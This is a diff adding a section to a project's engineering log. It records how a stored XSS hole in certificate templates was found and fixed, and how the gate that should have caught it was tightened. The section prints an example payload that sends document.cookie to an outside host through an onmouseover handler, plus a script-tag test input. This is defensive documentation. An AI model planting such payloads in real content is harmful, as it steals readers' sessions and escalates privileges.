@@ -4278,6 +4278,88 @@ pick-up — empty tables, not broken readers, but indistinguishable from the
 outside, so `SmokeMarkerSeeder` now plants a marker in each of the three and
 the walk is a real answer rather than a hopeful one.
 
+## 5ct. The gate was green and its own declaration was the hole (2026-09-14)
+
+A sweep of every `{!! !!}` in the Blade views — 24 sinks — asking not "is this
+unescaped" but **"what sanitises the value on the way in"**.
+
+Twenty were genuinely safe. Three were plain text with no business being
+unescaped (`e-learning/show.blade.php`, now `{{ }}`). **One was live.**
+
+### The certificate
+
+`SaveCertificateTemplateAction` sanitised the template body with:
+
+    strip_tags($body, '<p><br><strong><em><h1><h2><h3><span>')
+
+`strip_tags` removes disallowed **tags** and keeps every **attribute** on the
+ones it allows. So `<p onmouseover="fetch('https://elsewhere/?c='+document.cookie)">`
+came through whole, into `documents/course-certificate.blade.php`, which
+renders it with `{!! $body_html !!}` — as **HTML**, per ADR-012, not PDF.
+
+`catalog.certificates.*` is open to `course_creator`, the lowest
+content-authoring role. A certificate is opened by admins, students and
+families. Script in one runs with the reader's session, not the author's. That
+is privilege escalation, not a formatting bug.
+
+### This is the same lesson for the third time
+
+`ValidateContentBlockDataAction` had the identical line and was fixed in #280 —
+**and the fix left a comment in that file explaining exactly this**. The
+comment stayed in that file. Compare §5cr, where a comment about soft deletes
+sat in one file while three others had the same bug. A comment is not a gate,
+so `tests/Architecture/StripTagsIsNotASanitiserTest.php` now bans `strip_tags`
+with a second argument. One-argument `strip_tags` — "give me the plain text" —
+is untouched and is the other eight uses.
+
+### The part worth dwelling on
+
+**A gate for this already existed** — `RawHtmlRendersAreDeclaredTest`, which
+requires every raw-HTML view to be declared with why it is acceptable. It was
+green. Its declaration for the certificate read:
+
+> `'documents/course-certificate.blade.php' => 'system-generated: template body and QR svg'`
+
+True of the QR. **False of the template body**, which is authored, not
+generated. The gate was keyed by **file**, one justification each, and that
+file has two sinks of different kinds — so the safe one's reason covered the
+unsafe one, and the declaration was doing the work of the analysis.
+
+Three changes, all to the existing gate rather than a second one beside it
+(rule 11 — the first draft of this slice *was* a second gate, deleted once the
+first was found):
+
+- **One entry per sink**, in `Baselines/raw_html_renders.php`, so a second kind
+  of content cannot shelter behind the first one's reason.
+- **The reason must name the writer** — the Action or controller calling
+  `HtmlSanitizer` — rather than asserting the value is safe. A claim cannot be
+  checked by the next reader; a file name can.
+- **React is swept too.** The gate read Blade only, so it could not see
+  `dangerouslySetInnerHTML` at all — and the new UI is React. Four sites, all
+  checked and all sound: the lesson player (PROFILE_LESSON, and `wrapHtml`
+  interpolates only an integer id and `$1` from the already-clean HTML), the
+  library review screen (the same column the public page renders, cleaned on
+  save rather than on approval, so a reviewer never opens raw submission), and
+  two generated Code39 barcodes. Nothing to fix; the point is that the gate
+  could not previously have told us that.
+
+Keyed by **expression**, not line number: a line number breaks whenever
+somebody edits the line above, which trains people to re-point a baseline
+without reading it. All 25 expressions are unique.
+
+### Verified
+
+Six feature cases against the real write path. **Five of the six fail against
+the old `strip_tags` line** — checked by reverting it and re-running, because a
+test that passes both before and after pins nothing. And the payload stored
+through `SaveCertificateTemplateAction` on the dev database:
+
+    in:  <h1>Certificate</h1><p onmouseover="fetch(0)">Awarded to <span class="n">Aishath</span></p><script>alert(1)</script>
+    out: <h1>Certificate</h1><p>Awarded to Aishath</p>
+
+Handler gone, `<script>` dropped with its contents rather than unwrapped into
+loose text, `<span>` unwrapped with the name intact, formatting kept.
+
 ## 5cs. 236 CSV writes, none of them escaped (2026-09-14)
 
 Found immediately after shipping seven new exports, by asking what the last
